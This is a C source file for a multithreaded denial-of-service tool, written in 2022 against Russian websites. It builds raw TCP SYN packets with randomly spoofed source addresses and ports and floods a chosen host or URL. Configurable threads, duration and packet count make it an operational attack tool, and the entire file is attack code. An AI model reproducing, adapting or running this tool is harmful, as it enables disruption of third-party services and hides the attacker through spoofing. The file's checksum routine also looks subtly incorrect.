/*
 * 	DDoS tool with IP spoofing and parallel connections
 * 	to bring russian orc websites to their knees
 *
 * 	by ishiki, 2022
 *
 * 	compile command: gcc main.c -o bombard -lpthread
 */

#include <time.h>
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <stdatomic.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PAYLOAD_LEN 2048
#define DEF_PAYLOAD "GET / HTTP/1.1\r\n\r\n"
// get a random byte
#define RANDB (rand() & 0xFF)
// get a random word
#define RANDW (rand() & 0xFFFF)


// pseudo header needed for checksum calculation
struct ippseudo
{
	uint32_t ippseudo_src_addr;
	uint32_t ippseudo_dst_addr;
	uint8_t ippseudo_plhdr;
	uint8_t ippseudo_proto;
	uint16_t ippseudo_tcp_len;
};

// TCP packet
struct tcp_pkt
{
	struct iphdr tp_iphdr;
	struct tcphdr tp_tcphdr;
	char tp_payload[PAYLOAD_LEN];
};

// pseudo TCP packet
struct pseudo_tcp_pkt
{
	struct ippseudo ptp_ipps;
	struct tcphdr ptp_tcphdr;
	char ptp_payload[PAYLOAD_LEN];
};

// connection configuration
struct conn_conf
{
	struct tcp_pkt cc_tcp_pkt;
	int cc_sock;
	struct sockaddr_in cc_sin;
};

char *dst_addr;
char *payload = NULL;
uint16_t dst_port = 80;
size_t ncon = 1;
size_t npac = 0;
size_t dur = 0;

static atomic_size_t nsent = 0;

// generate a random IP address
static in_addr_t rand_addr()
{
	char buff[32] = {0};
	sprintf(buff, "%d.%d.%d.%d", RANDB, RANDB, RANDB, RANDB);
	return inet_addr(buff);
}

// get IP address by host name
static int get_addr(const char *host, char *buff)
{
	struct hostent *he;
	struct in_addr **addr_list;

	if ((he = gethostbyname(host)) == NULL)
		return -1;

	addr_list = (struct in_addr **)he->h_addr_list;

	// return first non-NULL address
	size_t i;
	for (i = 0; addr_list[i] == NULL; ++i) {
	}

	strcpy(buff, inet_ntoa(*addr_list[i]));
	return 0;
}

// check if hostname starts with "http://"
static int is_http(char *host)
{
	char tmp = host[7];
	host[7] = '\0';
	int res = strcmp("http://", host);
	host[7] = tmp;

	return res == 0;
}

// check if hostname starts with "https://"
static int is_https(char *host)
{
	char tmp = host[8];
	host[8] = '\0';
	int res = strcmp("https://", host);
	host[8] = tmp;

	return res == 0;
}

// calculate checksum for a given data array
static uint16_t chksum(uint16_t *data, size_t len)
{
	uint16_t sum = 0;

	for (size_t i = 0; i < len; i+=2)
		sum += data[i];

	if (len & 1)
		sum += *(u_char *)&data[len - 1];

	sum = (sum >> 16) + (sum & 0xFFFF);
	return ~(sum + (sum >> 16));
}

// initialize a TCP connection with spoofed IP
static int init_conn(struct conn_conf *con, in_addr_t dst_addr, 
		in_port_t dst_port, const char *pl)
{
	int sock;
	struct sockaddr_in sin;
	struct tcp_pkt pkt;

	// create raw socket
	if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
		perror("socket");
		return -1;
	}

	// copy payload
	strcpy(con->cc_tcp_pkt.tp_payload, pl);

	// socket
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dst_port);
	sin.sin_addr.s_addr = rand_addr();

	// IP header
	pkt.tp_iphdr.ihl = 5;
	pkt.tp_iphdr.version = 4;
	pkt.tp_iphdr.tos = 0;
	pkt.tp_iphdr.tot_len = sizeof(struct tcp_pkt) - (PAYLOAD_LEN - strlen(pl));
	pkt.tp_iphdr.id = htonl(54321);
	pkt.tp_iphdr.frag_off = 0;
	pkt.tp_iphdr.ttl = 255;
	pkt.tp_iphdr.protocol = IPPROTO_TCP;
	pkt.tp_iphdr.check = 0;
	pkt.tp_iphdr.saddr = sin.sin_addr.s_addr;
	pkt.tp_iphdr.daddr = dst_addr;
	pkt.tp_iphdr.check = chksum((uint16_t *)&pkt.tp_iphdr, pkt.tp_iphdr.tot_len);

	// TCP header
	pkt.tp_tcphdr.source = htons(RANDW);
	pkt.tp_tcphdr.dest = htons(dst_port);
	pkt.tp_tcphdr.seq = 0;
	pkt.tp_tcphdr.ack_seq = 0;
	pkt.tp_tcphdr.doff = 5;
	pkt.tp_tcphdr.fin = 0;
	pkt.tp_tcphdr.syn = 1;
	pkt.tp_tcphdr.rst = 0;
	pkt.tp_tcphdr.psh = 0;
	pkt.tp_tcphdr.ack = 0;
	pkt.tp_tcphdr.urg = 0;
	pkt.tp_tcphdr.window = htons(5840);
	pkt.tp_tcphdr.check = 0;
	pkt.tp_tcphdr.urg_ptr = 0;

	// pseudo IP header
	struct ippseudo ipps;
	ipps.ippseudo_src_addr = sin.sin_addr.s_addr;
	ipps.ippseudo_dst_addr = pkt.tp_iphdr.daddr;
	ipps.ippseudo_plhdr = 0;
	ipps.ippseudo_proto = IPPROTO_TCP;
	ipps.ippseudo_tcp_len = htons(sizeof(struct tcphdr));

	// pseudo TCP packet
	struct pseudo_tcp_pkt ppkt = {
		.ptp_ipps = ipps,
		.ptp_tcphdr = pkt.tp_tcphdr,
	};
	strcpy(ppkt.ptp_payload, pkt.tp_payload);
	size_t len = sizeof(struct pseudo_tcp_pkt) - (PAYLOAD_LEN - strlen(pl));

	// TCP packet checksum
	pkt.tp_tcphdr.check = chksum((uint16_t *)&ppkt, len);

	int one = 1;
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
		perror("setsockopt");
		return -1;
	}

	con->cc_sin = sin;
	con->cc_sock = sock;
	con->cc_tcp_pkt = pkt;
	return 0;
}

// spoof TCP packet by changing source IP, source port and header checksums
static void spoof_pkt(struct conn_conf *con)
{
	con->cc_sin.sin_addr.s_addr = rand_addr();

	con->cc_tcp_pkt.tp_iphdr.saddr = con->cc_sin.sin_addr.s_addr;
	con->cc_tcp_pkt.tp_iphdr.check = 0;
	con->cc_tcp_pkt.tp_iphdr.check = chksum(
		(uint16_t *)&con->cc_tcp_pkt.tp_iphdr, con->cc_tcp_pkt.tp_iphdr.tot_len);
	con->cc_tcp_pkt.tp_tcphdr.source = htons(RANDW);

	// pseudo IP header
	struct ippseudo ipps;
	ipps.ippseudo_src_addr = con->cc_sin.sin_addr.s_addr;
	ipps.ippseudo_dst_addr = con->cc_tcp_pkt.tp_iphdr.daddr;
	ipps.ippseudo_plhdr = 0;
	ipps.ippseudo_proto = IPPROTO_TCP;
	ipps.ippseudo_tcp_len = htons(sizeof(struct tcphdr));

	// pseudo TCP packet
	struct pseudo_tcp_pkt ppkt = {
		.ptp_ipps = ipps,
		.ptp_tcphdr = con->cc_tcp_pkt.tp_tcphdr
	};
	strcpy(ppkt.ptp_payload, con->cc_tcp_pkt.tp_payload);
	size_t len = sizeof(struct pseudo_tcp_pkt) - (PAYLOAD_LEN - strlen(ppkt.ptp_payload));
	
	// TCP packet checksum
	con->cc_tcp_pkt.tp_tcphdr.check = chksum((uint16_t *)&ppkt, len);
}

// send packet to its destination
static int snd_pkt(const struct conn_conf *con)
{
	++nsent;
	return sendto(con->cc_sock, (void *)&con->cc_tcp_pkt, 
		con->cc_tcp_pkt.tp_iphdr.tot_len, 0, 
		(struct sockaddr *)&con->cc_sin, sizeof(struct sockaddr_in));
}

// bombardier thread
void *pthread_conn(void *args)
{
	// initialize connection
	struct conn_conf con;
	init_conn(&con, inet_addr(dst_addr), dst_port, payload);

	// bombard loop
	while (1) {
		switch (npac)
		{
		case 0: break;
		default:
			if (nsent >= npac)
				return NULL;
			break;
		}

		spoof_pkt(&con);
		if (snd_pkt(&con) < 0) {
			perror("snd_pkt");
			break;
		}
	}

	return NULL;
}

// SIGINT handler
void int_handler(int sig)
{
	printf("\n%lu packets sent\n", nsent);
	exit(EXIT_SUCCESS);
}

static void print_help()
{
 	puts("DDoS tool with IP spoofing and parallel connections");
 	puts("to bring russian orc websites to their knees\n");
 	puts("\tby ishiki, 2022\n");
 	puts("usage: sudo ./bombard <options>");
 	puts("\t-a <address>\t: destination IP address");
 	puts("\t-u <host url>\t: destination URL");
 	puts("\t-p <port>\t: destination port number");
 	puts("\t-l <payload>\t: data payload to send");
 	puts("\t-c <num>\t: number of connections");
 	puts("\t-d <num>\t: duration of attack (in seconds)");
 	puts("\t-n <num>\t: number of packets to send");
 	puts("\t-h\t\t: print help message");
}

int main(int argc, char **argv)
{
	// initialize components
	srand(time(0));
	signal(SIGINT, int_handler);

	int ok = 0;
	int d = 0;

	// parse arguments
	for (int i = 1; i < argc; ++i) {
		if (argv[i][0] != '-')
			continue;

		switch (argv[i][1])
		{
		case 'a': 	// address
			ok = 1;
			dst_addr = argv[++i];
			break;
		case 'u': 	// url
		{
			ok = 1;
			d = 1;
			char *hostname = argv[++i];

			if (is_http(hostname)) {
				dst_port = 80;
				hostname += 7; 	// trim "http://"
			} else if (is_https(hostname)) {
				dst_port = 443;
				hostname += 8; 	// trim "https://"
			}

			dst_addr = malloc(NI_MAXHOST);
			if (get_addr(hostname, dst_addr) < 0) {
				char msg[] = "unable to resolve host\n";
				write(STDERR_FILENO, msg, sizeof(msg));
				return EXIT_FAILURE;
			}

			break;
		}
		case 'p': 	// port
			dst_port = atoi(argv[++i]);
			break;
		case 'l': 	//payload
			payload = argv[++i];
			break;
		case 'c': 	//number of connections 
			ncon = atoi(argv[++i]);
			break;
		case 'd': 	// duration
			dur = atoi(argv[++i]);
			break;
		case 'n': 	//number of packets
			npac = atoi(argv[++i]);
			break;
		case 'h': 	// help
			print_help();
			return EXIT_SUCCESS;
		default:
			printf("error: invalid flag\n");
			return EXIT_FAILURE;
		}
	}

	if (!ok) {
		printf("error: destination IP address or host url required/n");
		return EXIT_FAILURE;
	}

	if (!payload)
		payload = DEF_PAYLOAD;

	printf("initializing attack on %s:%u with %lu connection(s)...\n",
			dst_addr, dst_port, ncon);

	// create threads
	pthread_t *threads = malloc(ncon * sizeof(pthread_t));
	for (size_t i = 0; i < ncon; ++i)
		pthread_create(&threads[i], NULL, pthread_conn, NULL);

	if (dur > 0) 	// wait for the end of attack
		sleep(dur);
	else 		// wait for any thread to terminate
		pthread_join(threads[0], NULL);

	// free resources and exit
	for (size_t i = 0; i < ncon; ++i)
		pthread_kill(threads[i], 0);
	free(threads);
	if (d)
		free(dst_addr);
	int_handler(0);
	return EXIT_SUCCESS;
}

